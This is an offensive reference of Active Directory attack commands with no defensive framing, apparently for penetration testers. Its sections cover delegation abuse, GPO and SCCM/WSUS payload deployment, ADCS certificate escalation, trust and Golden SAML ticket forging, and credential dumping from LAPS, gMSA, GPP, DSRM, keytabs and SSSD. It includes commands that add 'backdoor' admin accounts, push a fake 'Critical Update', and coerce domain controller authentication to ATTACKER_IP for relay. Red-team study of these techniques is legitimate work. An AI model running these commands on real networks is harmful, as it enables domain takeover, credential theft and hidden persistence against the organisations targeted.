# Advanced Active Directory Attacks Reference

## Table of Contents
1. [Delegation Attacks](#delegation-attacks)
2. [Group Policy Object Abuse](#group-policy-object-abuse)
3. [RODC Attacks](#rodc-attacks)
4. [SCCM/WSUS Deployment](#sccmwsus-deployment)
5. [AD Certificate Services (ADCS)](#ad-certificate-services-adcs)
6. [Trust Relationship Attacks](#trust-relationship-attacks)
7. [ADFS Golden SAML](#adfs-golden-saml)
8. [Credential Sources](#credential-sources)
9. [Linux AD Integration](#linux-ad-integration)

---

## Delegation Attacks

### Unconstrained Delegation

When a user authenticates to a computer with unconstrained delegation, their TGT is saved to memory.

**Find Delegation:**
```powershell
# PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# BloodHound
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
```

**SpoolService Abuse:**
```bash
# Check spooler service
ls \\dc01\pipe\spoolss

# Trigger with SpoolSample
.\SpoolSample.exe DC01.domain.local HELPDESK.domain.local

# Or with printerbug.py
python3 printerbug.py 'domain/user:pass'@DC01 ATTACKER_IP
```

**Monitor with Rubeus:**
```powershell
Rubeus.exe monitor /interval:1
```

### Constrained Delegation

**Identify:**
```powershell
Get-DomainComputer -TrustedToAuth | select -exp msds-AllowedToDelegateTo
```

**Exploit with Rubeus:**
```powershell
# S4U2 attack
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

**Exploit with Impacket:**
```bash
getST.py -spn HOST/target.domain.local 'domain/user:password' -impersonate Administrator -dc-ip DC_IP
```

### Resource-Based Constrained Delegation (RBCD)

```powershell
# Create machine account
New-MachineAccount -MachineAccount AttackerPC -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# Set delegation
Set-ADComputer target -PrincipalsAllowedToDelegateToAccount AttackerPC$

# Get ticket
.\Rubeus.exe s4u /user:AttackerPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

---

## Group Policy Object Abuse

### Find Vulnerable GPOs

```powershell
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs | Where-Object {($_.ActiveDirectoryRights.ToString() -match "GenericWrite|WriteDacl|WriteOwner")}
```

### Abuse with SharpGPOAbuse

```powershell
# Add local admin
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# Add user rights
.\SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount attacker --GPOName "Vulnerable GPO"

# Add immediate task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "Vulnerable GPO"
```

### Abuse with pyGPOAbuse (Linux)

```bash
./pygpoabuse.py DOMAIN/user -hashes lm:nt -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
```

---

## RODC Attacks

### RODC Golden Ticket

RODCs contain filtered AD copy (excludes LAPS/Bitlocker keys). Forge tickets for principals in msDS-RevealOnDemandGroup.

### RODC Key List Attack

**Requirements:**
- krbtgt credentials of the RODC (-rodcKey)
- ID of the krbtgt account of the RODC (-rodcNo)

```bash
# Impacket keylistattack
keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full

# Using secretsdump with keylist
secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist
```

**Using Rubeus:**
```powershell
Rubeus.exe golden /rodcNumber:25078 /aes256:RODC_AES256_KEY /user:Administrator /id:500 /domain:domain.local /sid:S-1-5-21-xxx
```

---

## SCCM/WSUS Deployment

### SCCM Attack with MalSCCM

```bash
# Locate SCCM server
MalSCCM.exe locate

# Enumerate targets
MalSCCM.exe inspect /all
MalSCCM.exe inspect /computers

# Create target group
MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device
MalSCCM.exe group /addhost /groupname:TargetGroup /host:TARGET-PC

# Create malicious app
MalSCCM.exe app /create /name:backdoor /uncpath:"\\SCCM\SCCMContentLib$\evil.exe"

# Deploy
MalSCCM.exe app /deploy /name:backdoor /groupname:TargetGroup /assignmentname:update

# Force checkin
MalSCCM.exe checkin /groupname:TargetGroup

# Cleanup
MalSCCM.exe app /cleanup /name:backdoor
MalSCCM.exe group /delete /groupname:TargetGroup
```

### SCCM Network Access Accounts

```powershell
# Find SCCM blob
Get-Wmiobject -namespace "root\ccm\policy\Machine\ActualConfig" -class "CCM_NetworkAccessAccount"

# Decrypt with SharpSCCM
.\SharpSCCM.exe get naa -u USERNAME -p PASSWORD
```

### WSUS Deployment Attack

```bash
# Using SharpWSUS
SharpWSUS.exe locate
SharpWSUS.exe inspect

# Create malicious update
SharpWSUS.exe create /payload:"C:\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user backdoor Password123! /add\"" /title:"Critical Update"

# Deploy to target
SharpWSUS.exe approve /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"

# Check status
SharpWSUS.exe check /updateid:GUID /computername:TARGET.domain.local

# Cleanup
SharpWSUS.exe delete /updateid:GUID /computername:TARGET.domain.local /groupname:"Demo Group"
```

---

## AD Certificate Services (ADCS)

### ESC1 - Misconfigured Templates

Template allows ENROLLEE_SUPPLIES_SUBJECT with Client Authentication EKU.

```bash
# Find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip DC_IP -vulnerable

# Request certificate as admin
certipy req -u user@domain.local -p password -ca CA-NAME -target ca.domain.local -template VulnTemplate -upn administrator@domain.local

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC4 - ACL Vulnerabilities

```python
# Check for WriteProperty
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -get-acl

# Add ENROLLEE_SUPPLIES_SUBJECT flag
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT

# Perform ESC1, then restore
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip DC_IP -value 0 -property mspki-Certificate-Name-Flag
```

### ESC8 - NTLM Relay to Web Enrollment

```bash
# Start relay
ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce authentication
python3 petitpotam.py ATTACKER_IP DC_IP

# Use certificate
Rubeus.exe asktgt /user:DC$ /certificate:BASE64_CERT /ptt
```

### Shadow Credentials

```bash
# Add Key Credential (pyWhisker)
python3 pywhisker.py -d "domain.local" -u "user1" -p "password" --target "TARGET" --action add

# Get TGT with PKINIT
python3 gettgtpkinit.py -cert-pfx "cert.pfx" -pfx-pass "password" "domain.local/TARGET" target.ccache

# Get NT hash
export KRB5CCNAME=target.ccache
python3 getnthash.py -key 'AS-REP_KEY' domain.local/TARGET
```

---

## Trust Relationship Attacks

### Child to Parent Domain (SID History)

```powershell
# Get Enterprise Admins SID from parent
$ParentSID = "S-1-5-21-PARENT-DOMAIN-SID-519"

# Create Golden Ticket with SID History
kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-CHILD-SID /krbtgt:KRBTGT_HASH /sids:$ParentSID /ptt
```

### Forest to Forest (Trust Ticket)

```bash
# Dump trust key
lsadump::trust /patch

# Forge inter-realm TGT
kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /rc4:TRUST_KEY /user:Administrator /service:krbtgt /target:external.com /ticket:trust.kirbi

# Use trust ticket
.\Rubeus.exe asktgs /ticket:trust.kirbi /service:cifs/target.external.com /dc:dc.external.com /ptt
```

---

## ADFS Golden SAML

**Requirements:**
- ADFS service account access
- Token signing certificate (PFX + decryption password)

```bash
# Dump with ADFSDump
.\ADFSDump.exe

# Forge SAML token
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s adfs.domain.local saml2 --endpoint https://target/saml --nameid administrator@domain.local
```

---

## Credential Sources

### LAPS Password

```powershell
# PowerShell
Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'

# CrackMapExec
crackmapexec ldap DC_IP -u user -p password -M laps
```

### GMSA Password

```powershell
# PowerShell + DSInternals
$gmsa = Get-ADServiceAccount -Identity 'SVC_ACCOUNT' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
```

```bash
# Linux with bloodyAD
python bloodyAD.py -u user -p password --host DC_IP getObjectAttributes gmsaAccount$ msDS-ManagedPassword
```

### Group Policy Preferences (GPP)

```bash
# Find in SYSVOL
findstr /S /I cpassword \\domain.local\sysvol\domain.local\policies\*.xml

# Decrypt
python3 Get-GPPPassword.py -no-pass 'DC_IP'
```

### DSRM Credentials

```powershell
# Dump DSRM hash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Enable DSRM admin logon
Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2
```

---

## Linux AD Integration

### CCACHE Ticket Reuse

```bash
# Find tickets
ls /tmp/ | grep krb5cc

# Use ticket
export KRB5CCNAME=/tmp/krb5cc_1000
```

### Extract from Keytab

```bash
# List keys
klist -k /etc/krb5.keytab

# Extract with KeyTabExtract
python3 keytabextract.py /etc/krb5.keytab
```

### Extract from SSSD

```bash
# Database location
/var/lib/sss/secrets/secrets.ldb

# Key location
/var/lib/sss/secrets/.secrets.mkey

# Extract
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
